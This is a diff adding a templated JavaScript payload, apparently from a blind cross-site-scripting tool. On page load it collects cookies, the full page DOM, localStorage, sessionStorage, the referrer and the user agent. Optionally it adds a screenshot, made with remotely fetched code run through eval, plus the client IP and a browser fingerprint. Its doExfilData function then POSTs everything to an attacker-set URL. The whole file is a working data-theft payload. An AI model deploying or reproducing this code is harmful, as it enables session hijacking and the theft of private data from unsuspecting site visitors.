@@ -1,0 +1,79 @@
+<%# SPDX-License-Identifier: GPL-3.0-or-later %>
+window.addEventListener("load", (function() {
+    var extract_url = "<%- locals.url %>",h2c = "https://html2canvas.hertzen.com/dist/html2canvas.min.js", ipurl = "https://ipinfo.io/json", fpurl = "https://openfpcdn.io/fingerprintjs/v3";
+
+    <% if (locals.data.doScreenshot) { %>
+    async function doScreenshot() {
+        var ss = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAAXNSR0IB2cksfwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAG9QTFRF////7+/vwMDAxMTEz8/P39/fgICAn5+fv7+/AAAA6Ojo5ubmPz8/f39/kpKSgYGBrq6uIiIiW1tboKCgkJCQsLCwICAgEBAQQEBAUFBQMDAwYGBgHx8fcHBwr6+vT09Pj4+PDw8PX19fLy8vb29vl/KeSAAABVlJREFUeJztmm2bsjYQhQlNEFvSbasL+Iag/P/f2MwkgYAiute61afn/qLEkMxJZhIyGEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4JkRsoC+/GW7WlKai+hGbrqOSnsXlz+nSYD5/p88/bjWUmQo6LPjz4+Pjr2+19SZsqSOb+Dn6kpC/TcE/32rrTf4vQkRqiN5GSBoUqHiVrGM5qjYQIuN1LII7PtdyXoharbhR8dnfLOLPJInDtuRqvGKoOLlrERkJkX528lX/81CILrhC6bSKDV1t5aQQbkLs+B4RafosbId739nOWSpzujqI3qaF7SwPh/ouIYGn6atCRN5V4EVObO1Fkd8UsrO1NtrVZsv7vnKelKpwtTqbsqE1s0K2JbOgy6OuK80NyGtCjuaz0fXJW8OWnY/ny94GQkwAuvHfc9UTCzm3utKnxly33QxlrmLqGm/aReutmRXSqxbOX4/OrLGQipr2Aow1ggbxaK7b20L2IhJ+GqltXlecI1CbuflcuN/F2QlRXkBNg/2YECqhCCzdqI2FaD+aFEyF+52EieamEHJDmua9KyhsHRXH6yRxfdBYnL0yElJ7xZGrMSvkpBmezT4GsitCeqclBPdlu7gd7KmrEQ5OVJV9U+G654O9HXQ2E++jYD8Fd84LSXmGsjuEhDV8gRw2FbQQFHxRCLdNM+MNHAth/9YeZf36i0Lo+lypgd3stsoV6FFnDwghu85+Zq4JobaP49s5RoqHhfie08Bujh3tCsiauRifEEIuTwuInHKtoLpKahfjZp+zPvm4kMqVU5vc6Uaqtfcknhn7SC7Wp4eEcFtlciimhNgA3CTJYWutsjt1aZeIx4TQKlsckryLgDBAu33EmMOL6JUHwRtCOAYMjV/rL3f2IALJKrvou33uMSGVa+bkTfBtLzqbAmkPChE84ns5FezUv9+iWxt+fEemHg/2qCK/bHTUm1BnZgwlu5TdmVM/Tqf5p60R5sF97mkgkubZPnhkTdOvnnFles0+mpH9VGfvgEzY4JQidC62Xxrjc+Vmw9v9/s3mYEj/3Lef9e6XRp14HWmyK+mct0O+91wAAF4DESeHstwk776iVN05Pr/roWpRlmX7bKMeRwQpgrmDs6U/yL8U9oiStbo9v7UQPv7s3en2yJ+XuWcuXMfu6x1C1KcLOBGvPn8m9OjwsxyEhs89F/ap256L7JGXHpJ074iBpsFJjVPadMaS1m2L9fN18Cl+GLm9odvu2qWyKVVwhxCfqeirlk8X4tOXoZCz1qnNPetOWJNlVFCIe4QsrRD+fqz1Rbb1GegLz4pULzHzQhrj55IMOkWDGJkQUotISfZREqCaiz6eJGRcqOI4SXb+l6UfUJ/VmxVih59TvBxmlJaoniykvnStMPfshXANnz+dFeIyJMuQZ/sW9zYYrUXY/UBIeq+QKw0NErHPgOd/kIAlz85S0Zs0mJFmQsg4mey+Fl2O+unHW97YE3ehlFVGkVmFQtrQ2EBI966puRTStfQzcJp6uaFdO92Zkfc5f/sW1AspZBDHPNTWQp/I5J1jJISTvxv7tXr+RtKlaJfOJhKWJy737IWYcWdhDcWxf4OTuZV1mXfXAyFczzSVbIrZN2vfQdq9D+/eWnB0hkJ8ttl6+rE33G2PF1lxZtH0Lf+AEGONSyXbhFPNued6GOxsU+PWaWHfb3fL1TJTV1atiDJZXuePpbJUGuSb00Hu2c3UZCr7do6bGv4v/+cV4IS8PxDyavwyQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0/wLrF92q1H3wnAAAAAASUVORK5CYII=";
+        try {
+            rr = await fetch(h2c), aa = await rr.text(), eval(aa);
+            let result = await html2canvas(document.body).then((function(t) {
+                ss = t.toDataURL("image/png")
+            }));
+            return ss
+        } catch (t) {
+            return ss
+        }
+    }
+    <% } %>
+    <% if (locals.data.doEnableExtCalls) { %>
+    async function doGetIpAddress() {
+        return (await fetch(ipurl)).json()
+    }
+    async function doFingerprint() {
+        const t = import(fpurl).then((t => t.load()));
+        if (typeof crypto.randomUUID === "function"){
+            e = crypto.randomUUID();
+        } else {
+            e = "00000000-0000-0000-0000-000000000000";
+        }
+        return await t.then((t => t.get())).then((t => e = t.visitorId)), e
+    }
+    <% } %>
+    function checkNull(t) {
+        return t || null
+    }
+    async function doExfilData(){
+        var bodyjson = {};
+        try{bodyjson.url = checkNull(document.URL)}catch(e){};
+        try{bodyjson.location = checkNull(window.location.href)}catch(e){};
+        try{bodyjson.referrer = checkNull(document.referrer)}catch(e){};
+        try{bodyjson.ua = checkNull(navigator.userAgent)}catch(e){};
+        try{bodyjson.cookies = checkNull(document.cookie)}catch(e){};
+        try{bodyjson.dom = checkNull(document.documentElement.outerHTML)}catch(e){};
+        try{bodyjson.origin = checkNull(location.origin)}catch(e){};
+        try{bodyjson.localStorage = checkNull(window.localStorage)}catch(e){};
+        try{bodyjson.sessionStorage = checkNull(window.sessionStorage)}catch(e){};
+
+        // Check for flags
+        <% if (locals.data.doScreenshot) { %>
+            try{bodyjson.screenshot = checkNull(await doScreenshot())}catch(e){};
+        <% } %>
+        <% if (locals.data.doEnableExtCalls) { %>
+            try{bodyjson.clientip = checkNull((await doGetIpAddress()).ip)}catch(e){};
+            try{bodyjson.fingerprint = checkNull(await doFingerprint())}catch(e){};
+        <% } else { %>
+            if (typeof crypto.randomUUID === "function"){
+                bodyjson.fingerprint = crypto.randomUUID();
+            } else {
+                bodyjson.fingerprint = "00000000-0000-0000-0000-000000000000";
+            }
+        <% } %>
+        <% if (locals.data.forceFingerprint) { %>
+            bodyjson.fingerprint = "<%= locals.data.forceFingerprint %>";
+        <% } %>
+        <% if (locals.data.client_name) { %>
+            bodyjson.clientname = "<%= locals.data.client_name %>";
+        <% } %>
+
+        fetch(extract_url, {
+            method: "POST",
+            headers: {
+                Accept: "application/json, text/plain, */*",
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(bodyjson)
+        });
+    }
+    doExfilData()
+}));
